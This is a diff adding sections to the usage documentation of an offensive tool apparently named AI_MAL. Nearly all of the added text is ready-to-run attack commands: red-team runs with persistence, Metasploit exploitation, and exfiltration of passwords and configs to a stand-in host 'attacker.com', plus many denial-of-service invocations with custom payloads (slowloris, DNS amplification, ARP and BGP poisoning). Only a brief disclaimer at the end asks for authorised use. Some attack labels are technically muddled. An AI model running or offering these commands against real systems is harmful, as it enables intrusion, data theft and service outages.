@@ -10,6 +10,8 @@ This document outlines various use cases and scenarios for the AI_MAL (Advanced 
 5. [System Requirements](#system-requirements)
 6. [Best Practices](#best-practices)
 7. [Troubleshooting](#troubleshooting)
+8. [Complex Argument Combinations](#complex-argument-combinations)
+9. [Enhanced DoS Attack Methods](#enhanced-dos-attack-methods)
 
 ## Basic Usage
 
@@ -261,5 +263,117 @@ The following table provides a comprehensive list of all available command-line 
 
 ## Additional Resources
 
-// ... rest of existing content ...
+## Complex Argument Combinations
+
+### Advanced Red Team Operations
+```bash
+# Full red team engagement with persistence and data exfiltration
+sudo AI_MAL 192.168.1.1 --red-team --persistence --exfil --exfil-method dns --exfil-data passwords --exfil-server attacker.com
+
+# Stealth red team operations with custom exfiltration
+sudo AI_MAL 192.168.1.1 --red-team --stealth --exfil --exfil-method icmp --exfil-data configs --exfil-server 10.0.0.1
+
+# Full red team with Metasploit integration and persistence
+sudo AI_MAL 192.168.1.1 --red-team --msf --exploit --persistence --exfil --exfil-method smb --exfil-data all
+```
+
+### Advanced DoS Operations
+```bash
+# Multi-method DoS attack with custom payload
+sudo AI_MAL 192.168.1.1 --dos --dos-method slowloris --dos-threads 50 --dos-duration 300 --dos-payload "GET / HTTP/1.1\r\nHost: 192.168.1.1\r\n"
+
+# Resource exhaustion attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method resource --dos-threads 100 --dos-duration 600
+
+# Protocol-specific DoS
+sudo AI_MAL 192.168.1.1 --dos --dos-method protocol --dos-threads 75 --dos-duration 180
+```
+
+### Advanced Network Discovery and Scanning
+```bash
+# Comprehensive network discovery with custom scripts
+sudo AI_MAL --auto-discover --custom-scripts --script-type python --execute-scripts --show-live-ai
+
+# Stealth network mapping with service detection
+sudo AI_MAL 192.168.1.0/24 --stealth --services --version --os --quiet
+
+# Continuous monitoring with vulnerability assessment
+sudo AI_MAL 192.168.1.1 --continuous --delay 5 --vuln --exploit --msf --workspace monitoring
+```
+
+## Enhanced DoS Attack Methods
+
+### Resource Exhaustion Attacks
+```bash
+# CPU exhaustion attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method cpu --dos-threads 100 --dos-duration 300
+
+# Memory exhaustion attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method memory --dos-threads 50 --dos-duration 600
+
+# Disk space exhaustion
+sudo AI_MAL 192.168.1.1 --dos --dos-method disk --dos-threads 25 --dos-duration 900
+```
+
+### Protocol-Specific Attacks
+```bash
+# HTTP/2 DoS (Multiple Stream Attack)
+sudo AI_MAL 192.168.1.1 --dos --dos-method http2 --dos-threads 75 --dos-duration 180
+
+# DNS Amplification
+sudo AI_MAL 192.168.1.1 --dos --dos-method dns --dos-threads 100 --dos-duration 300
+
+# TCP Connection Exhaustion
+sudo AI_MAL 192.168.1.1 --dos --dos-method tcp --dos-threads 200 --dos-duration 120
+```
+
+### Application-Specific Attacks
+```bash
+# Web Server DoS (Slow POST)
+sudo AI_MAL 192.168.1.1 --dos --dos-method slowpost --dos-threads 50 --dos-duration 240
+
+# Database Connection Pool Exhaustion
+sudo AI_MAL 192.168.1.1 --dos --dos-method dbpool --dos-threads 100 --dos-duration 300
+
+# Cache Poisoning Attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method cache --dos-threads 75 --dos-duration 180
+```
+
+### Network Infrastructure Attacks
+```bash
+# BGP Route Poisoning
+sudo AI_MAL 192.168.1.1 --dos --dos-method bgp --dos-threads 25 --dos-duration 600
+
+# ARP Cache Poisoning
+sudo AI_MAL 192.168.1.1 --dos --dos-method arp --dos-threads 50 --dos-duration 300
+
+# VLAN Hopping Attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method vlan --dos-threads 75 --dos-duration 240
+```
+
+### Advanced Attack Combinations
+```bash
+# Multi-vector attack with resource exhaustion
+sudo AI_MAL 192.168.1.1 --dos --dos-method "cpu,memory,disk" --dos-threads 100 --dos-duration 300
+
+# Protocol stack attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method "tcp,http2,dns" --dos-threads 150 --dos-duration 180
+
+# Infrastructure and application attack
+sudo AI_MAL 192.168.1.1 --dos --dos-method "bgp,dbpool,cache" --dos-threads 75 --dos-duration 240
+```
+
+### Custom Attack Payloads
+```bash
+# Custom HTTP payload for web server DoS
+sudo AI_MAL 192.168.1.1 --dos --dos-method http --dos-payload "POST /api/v1/data HTTP/1.1\r\nContent-Length: 1000000\r\n\r\n"
+
+# Custom TCP payload for connection exhaustion
+sudo AI_MAL 192.168.1.1 --dos --dos-method tcp --dos-payload "SYN|ACK|RST|FIN"
+
+# Custom DNS query for amplification
+sudo AI_MAL 192.168.1.1 --dos --dos-method dns --dos-payload "ANY query for large domain"
+```
+
+Note: All DoS attacks should be used responsibly and only on systems you have permission to test. Unauthorized DoS attacks may be illegal in many jurisdictions.
    
